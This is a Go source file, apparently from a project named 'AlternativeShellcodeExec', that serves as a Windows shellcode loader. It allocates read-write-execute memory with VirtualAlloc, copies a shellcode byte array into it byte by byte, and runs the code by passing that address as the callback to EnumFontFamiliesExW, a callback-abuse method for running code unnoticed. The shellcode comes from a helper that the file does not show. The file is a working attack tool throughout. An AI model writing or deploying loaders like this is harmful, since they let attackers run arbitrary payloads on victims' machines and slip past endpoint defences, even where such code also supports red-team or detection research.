package main

import (
	"AlternativeShellcodeExec/pkg/util"
	"golang.org/x/sys/windows"
	"unsafe"
)

type LOGFONTW struct {
	LfHeight         int32
	LfWidth          int32
	LfEscapement     int32
	LfOrientation    int32
	LfWeight         int32
	LfItalic         uint8
	LfUnderline      uint8
	LfStrikeOut      uint8
	LfCharSet        uint8
	LfOutPrecision   uint8
	LfClipPrecision  uint8
	LfQuality        uint8
	LfPitchAndFamily uint8
	LfFaceName       [32]uint16
}

func Run(op []byte) {
	kernel32 := windows.NewLazySystemDLL("kernel32.dll")
	gdi32 := windows.NewLazySystemDLL("gdi32.dll")
	user32 := windows.NewLazySystemDLL("user32.dll")

	virtualAlloc := kernel32.NewProc("VirtualAlloc")
	getDC := user32.NewProc("GetDC")
	enumFontFamiliesEx := gdi32.NewProc("EnumFontFamiliesExW")
	opLen := len(op)
	addr, _, _ := virtualAlloc.Call(0, uintptr(len(op)), windows.MEM_RESERVE|windows.MEM_COMMIT, windows.PAGE_EXECUTE_READWRITE)
	if addr == 0 {
		panic("VirtualAlloc failed")
	}

	for i := 0; i < opLen; i++ {
		*(*byte)(unsafe.Pointer(addr + uintptr(i))) = op[i]
	}

	//copy((*[1 << 30]byte)(unsafe.Pointer(addr))[:], op)

	dc, _, _ := getDC.Call(0)

	lf := LOGFONTW{}
	enumFontFamiliesEx.Call(dc, uintptr(unsafe.Pointer(&lf)), addr, 0, 0)
}

func main() {
	Run(util.ShellCode())
}
